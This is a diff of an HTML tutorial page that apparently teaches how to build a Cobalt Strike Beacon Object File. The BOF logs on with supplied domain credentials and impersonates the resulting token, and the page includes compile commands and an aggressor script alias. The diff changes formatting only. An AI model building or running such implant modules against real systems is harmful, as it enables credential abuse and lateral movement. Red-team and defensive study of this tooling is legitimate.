@@ -2,9 +2,9 @@
 <head>
 <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
 <title>Data Parser API</title>
-</head><body><br/>
+</head><body><tt><br/>
 <br/>
-<u><span style="font-size: 20pt">This is where we are able to actually input any value</span></u><br/>
+<span style="font-size: 20pt"><u>This is where we are able to actually input any value</u></span><br/>
 <br/>
 <br/>
 <br/>
@@ -16,8 +16,8 @@
 </ul>
 </li>
 </ul>
-<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><b><span style="font-size: 16pt">In the function prototype</span></b></li>
-<li style="list-style-type: none"><ul><li style="list-style-type: none"><i><span style="font-size: 14pt">a pointer to a character buffer and a length value</span></i></li>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 16pt"><b>In the function prototype</b></span></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 14pt"><i>a pointer to a character buffer and a length value</i></span></li>
 </ul>
 </li>
 <li style="list-style-type: none"><img src="image 4.png"/></li>
@@ -35,7 +35,7 @@
 <img src="image 2.png"/><br/>
 <br/>
 <br/>
-<span style="font-size: 20pt"><b><u>Parsing the arguments using the internal API</u></b></span><ul><li style="list-style-type: none"><span style="font-size: 18pt"><b>highly recommended to use</b></span></li>
+<u><b><span style="font-size: 20pt">Parsing the arguments using the internal API</span></b></u><ul><li style="list-style-type: none"><b><span style="font-size: 18pt">highly recommended to use</span></b></li>
 </ul>
 <br/>
 <img height="325" src="image.png" width="500"/><br/>
@@ -46,8 +46,8 @@
 </ul>
 </li>
 </ul>
-<span style="color: #00007f"><span style="font-size: 16pt">new code color</span></span><br/>
-<span style="font-size: 14pt"><span style="color: #000000">===================================================<br/>
+<span style="font-size: 16pt"><span style="color: #00007f">new code color</span></span><br/>
+<span style="color: #000000"><span style="font-size: 14pt">===================================================<br/>
 <span style="font-family: Rockwell">#include &lt;windows.h&gt;                           <br/>
 #include &quot;beacon.h&quot;                           <br/>
 <br/>
@@ -55,7 +55,7 @@ WINADVAPI		WINBOOL  	WINAPI ADVAPI32$LogonUserA (LPCSTR lpszUsername,LPCSTR lpsz
 WINBASEAPI 	WINBOOL 	WINAPI KERNEL32$GetLastError (VOID);<br/>
 WINBASEAPI 	DWORD		WINAPI KERNEL32$CloseHandle (HANDLE hObject);<br/>
 <br/>
-void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"><ul><span style="color: #000000"><li style="list-style-type: none">HANDLE hToken;			</li>
+void go(char * buff, int len) {</span></span></span><span style="font-size: 14pt"><span style="font-family: Rockwell"><ul><span style="color: #000000"><li style="list-style-type: none">HANDLE hToken;			</li>
 </span><span style="color: #00007f"><li style="list-style-type: none">dataap parser;</li>
 <li style="list-style-type: none">char * domain;</li>
 <li style="list-style-type: none">char * user;</li>
@@ -76,7 +76,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 <li style="list-style-type: none"><ul><li style="list-style-type: none"/>
 </ul>
 </li>
-</span><li style="list-style-type: none"><span style="color: #000000">if (ADVAPI32$LogonUserA(</span><b><span style="color: #00007f">user</span></b><span style="color: #000000">, </span><b><span style="color: #00007f">domain</span></b><span style="color: #000000">, </span><b><span style="color: #00007f">pass</span></b><span style="color: #000000">, LOGON_32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &amp;hToken)) {</span></li>
+</span><li style="list-style-type: none"><span style="color: #000000">if (ADVAPI32$LogonUserA(</span><span style="color: #00007f"><b>user</b></span><span style="color: #000000">, </span><span style="color: #00007f"><b>domain</b></span><span style="color: #000000">, </span><span style="color: #00007f"><b>pass</b></span><span style="color: #000000">, LOGON_32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &amp;hToken)) {</span></li>
 <li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><span style="color: #000000"><li style="list-style-type: none">BeaconUseToken(hToken);  					// BeaconUseToken will print a message on success, so we can remove the BeaconPrintf</li>
 <li style="list-style-type: none">KERNEL32$CloseHandle(hToken);  </li>
 </span></ul>
@@ -97,23 +97,22 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 </span></span><span style="color: #000000"><span style="font-family: Rockwell">}</span><br/>
 <br/>
 ============================================================<br/>
-<ul><li style="list-style-type: none"><b>BeaconDataExtract</b>(pointerToParser, (optional)size of domain value)  	=  we put NULL because bof_pack terminated them for us</li>
+</span></span><span style="color: #000000"><ul><span style="font-size: 14pt"><li style="list-style-type: none"><b>BeaconDataExtract</b>(pointerToParser, (optional)size of domain value)  	=  we put NULL because bof_pack terminated them for us</li>
 <li style="list-style-type: none"><ul><li style="list-style-type: none">Function is also operating on the buffer and returning a pointer within it</li>
-<li style="list-style-type: none"><ul><li style="list-style-type: none"><i><span style="font-size: 12pt">you dont need to worry about freeing anything from the buffer because it is being managed by beacon in the background</span></i></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 12pt"><i>you dont need to worry about freeing anything from the buffer because it is being managed by beacon in the background</i></span></li>
 </ul>
 </li>
 </ul>
 </li>
 <li style="list-style-type: none"/>
 <li style="list-style-type: none"><b>datap parser;	 =	</b>this is on the stack and taken care of when the function exits</li>
-</ul>
-</span></span><span style="color: #000000"><ul><li style="list-style-type: none"><ul><span style="font-size: 14pt"><li style="list-style-type: none">The idea here is that we now have a </li>
+</span><li style="list-style-type: none"><ul><span style="font-size: 14pt"><li style="list-style-type: none">The idea here is that we now have a </li>
 </span><li style="list-style-type: none"><ul><span style="font-size: 14pt"><i><li style="list-style-type: none">BOF file </li>
 <li style="list-style-type: none">a aggressor script</li>
 </i></span><span style="font-size: 20pt"><li style="list-style-type: none"/>
 </span></ul>
 </li>
-<span style="font-size: 20pt"><li style="list-style-type: none"><u><b>compile it</b></u></li>
+<span style="font-size: 20pt"><li style="list-style-type: none"><b><u>compile it</u></b></li>
 </span><li style="list-style-type: none"><ul><span style="font-size: 20pt"><li style="list-style-type: none">&gt; x86_64-w64mingw32-gcc -c luser.c -o luser.x64.o</li>
 <li style="list-style-type: none"/>
 </span><li style="list-style-type: none"><img height="212" src="image 5.png" width="800"/></li>
@@ -129,7 +128,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 </ul>
 <br/>
 </span><span style="font-size: 12pt">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><span style="font-size: 14pt"><br/>
-</span><ul><li style="list-style-type: none"><ul><span style="font-size: 20pt"><li style="list-style-type: none"><b><u>compile it as a 32 bit BOF</u></b></li>
+</span><ul><li style="list-style-type: none"><ul><span style="font-size: 20pt"><li style="list-style-type: none"><u><b>compile it as a 32 bit BOF</b></u></li>
 </span><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 18pt">use 32 bit compiler</span></li>
 </ul>
 </li>
@@ -140,8 +139,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 </li>
 </ul>
 <br/>
-<span style="font-size: 20pt">&gt; i686_w64-mingw32-gcc -c luser.c -o luser.x64.o</span><span style="font-size: 14pt"><br/>
-</span><span style="font-size: 14pt"/></span><span style="font-size: 14pt"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 18pt"><b><span style="color: #007f7f">query architecture of beacon file</span></b></span><span style="color: #000000"/></li>
+<span style="font-size: 20pt">&gt; i686_w64-mingw32-gcc -c luser.c -o luser.x64.o</span><span style="font-size: 14pt"/></span><span style="font-size: 14pt"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="color: #007f7f"><b><span style="font-size: 18pt">query architecture of beacon file</span></b></span></li>
 </ul>
 </li>
 </ul>
@@ -149,7 +147,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 # $1 = beacon ID                          <br/>
 # $2 = DOMAIN\user<br/>
 # $3 = password<br/>
-alias luser {</span><ul><li style="list-style-type: none"><span style="color: #000000">local('$handle $data $args $domain $user $pass </span><span style="color: #007f7f"><b>$arch</b></span><span style="color: #000000">');</span></li>
+</span><span style="color: #000000">alias luser {</span><ul><li style="list-style-type: none"><span style="color: #000000">local('$handle $data $args $domain $user $pass </span><b><span style="color: #007f7f">$arch</span></b><span style="color: #000000">');</span></li>
 <span style="color: #000000"><li style="list-style-type: none"/>
 <li style="list-style-type: none"># check our arguments</li>
 <li style="list-style-type: none">if (size(@_) != 3) {</li>
@@ -164,11 +162,10 @@ alias luser {</span><ul><li style="list-style-type: none"><span style="color: #0
 <li style="list-style-type: none">$pass           = $3;</li>
 <li style="list-style-type: none"/>
 <li style="list-style-type: none"># read in our BOF file.....</li>
-</span><li style="list-style-type: none"><b><span style="color: #007f7f">$arch 	 =	barch($1);</span></b><span style="color: #000000"/></li>
-<li style="list-style-type: none"><span style="color: #000000">$handle	 = 	openf(script_resource(</span><b><span style="color: #007f7f">&quot;luser. $+ $arch $+ .o&quot;</span></b><span style="color: #000000">));</span></li>
+</span><li style="list-style-type: none"><span style="color: #007f7f"><b>$arch 	 =	barch($1);</b></span></li>
+<li style="list-style-type: none"><span style="color: #000000">$handle	 = 	openf(script_resource(</span><span style="color: #007f7f"><b>&quot;luser. $+ $arch $+ .o&quot;</b></span><span style="color: #000000">));</span></li>
 </ul>
-<span style="color: #000000"><ul>$data	 =	readb($handle, -1);</ul>
-<ul><li style="list-style-type: none">closef($handle);</li>
+<span style="color: #000000">$data	 =	readb($handle, -1);<ul><li style="list-style-type: none">closef($handle);</li>
 <li style="list-style-type: none"/>
 <li style="list-style-type: none"># pack our arguments using bof_pack, which accepts beacon id and format string</li>
 <li style="list-style-type: none"/>
@@ -183,7 +180,7 @@ alias luser {</span><ul><li style="list-style-type: none"><span style="color: #0
 }<br/>
 <br/>
 ============================================================<br/>
-<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><b><span style="font-size: 18pt">Then reload script</span></b></li>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 18pt"><b>Then reload script</b></span></li>
 </ul>
 </li>
 </ul>
@@ -192,4 +189,4 @@ alias luser {</span><ul><li style="list-style-type: none"><span style="color: #0
 <br/>
 <br/>
 <br/>
-</span></span></body></html>
+</span></span></tt></body></html>
